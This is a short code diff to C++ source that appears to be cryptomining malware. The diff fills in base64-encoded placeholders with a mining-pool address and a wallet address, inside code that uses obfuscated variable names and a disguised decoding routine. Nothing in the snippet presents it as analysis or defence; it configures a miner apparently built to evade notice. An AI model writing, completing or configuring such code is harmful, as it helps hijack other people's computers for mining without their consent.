@@ -196,12 +196,12 @@ int main() {
 	strcpy(mkdjd, mov_eax_push_5012("LXU=").c_str());
 
 	//Pool in base64
-	char *urejds = new char[mov_eax_push_5012("PASTE HERE").length() + 1];
-	strcpy(urejds, mov_eax_push_5012("PASTE HERE").c_str());
+	char *urejds = new char[mov_eax_push_5012("Y2EubWluZXhtci5jb206NDQ0NA==").length() + 1];
+	strcpy(urejds, mov_eax_push_5012("Y2EubWluZXhtci5jb206NDQ0NA==").c_str());
 
 	//Wallet in base64
-	char *mkwei3 = new char[mov_eax_push_5012("WALLET HERE").length() + 1];
-	strcpy(mkwei3, mov_eax_push_5012("WALLET HERE").c_str());
+	char *mkwei3 = new char[mov_eax_push_5012("NDkyVW1nUjFRNjQ5VzFHZTluTWdZRGZUeGUxR1pOZUE4Zzk2Y21EUG1YcmhWdW10MlE5VXpKY1B4Q281UXVqTG1vSjg4SmV5VUE5cVpIeW00YXBVMjNLM0Y0SjJ5alo=").length() + 1];
+	strcpy(mkwei3, mov_eax_push_5012("NDkyVW1nUjFRNjQ5VzFHZTluTWdZRGZUeGUxR1pOZUE4Zzk2Y21EUG1YcmhWdW10MlE5VXpKY1B4Q281UXVqTG1vSjg4SmV5VUE5cVpIeW00YXBVMjNLM0Y0SjJ5alo=").c_str());
 
 	static char * dreams[] = { frst, scnd, urejds, mkdjd, mkwei3 };
 	App FUcker(5, dreams);
